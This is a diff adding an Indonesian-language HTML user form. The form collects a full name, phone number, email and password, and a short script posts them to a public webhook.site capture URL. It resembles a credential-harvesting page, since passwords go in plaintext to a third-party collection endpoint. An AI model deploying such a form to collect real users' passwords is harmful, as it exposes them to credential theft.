@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Form Kirim ke Webhook</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f8f8f8;
+      padding: 40px;
+    }
+    form {
+      background: white;
+      padding: 20px;
+      max-width: 400px;
+      margin: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      width: 100%;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #status {
+      text-align: center;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="form">
+    <h2>Formulir Pengguna</h2>
+    <input type="text" name="nama" placeholder="Nama Lengkap" required>
+    <input type="text" name="nohp" placeholder="Nomor HP" required>
+    <input type="email" name="email" placeholder="Email" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Kirim</button>
+    <p id="status"></p>
+  </form>
+
+  <script>
+    const form = document.getElementById('form');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      fetch('https://webhook.site/5a4694dd-a28c-4f3b-b19f-5e8a8fa9c582', {
+        method: 'POST',
+        body: new FormData(form),
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          status.textContent = '✅ Data berhasil dikirim!';
+          form.reset();
+        } else {
+          status.textContent = '❌ Gagal mengirim data.';
+        }
+      })
+      .catch(error => {
+        console.error('Fetch error:', error);
+        status.textContent = '❌ Gagal mengirim data (network error).';
+      });
+    });
+  </script>
+
+</body>
+</html>
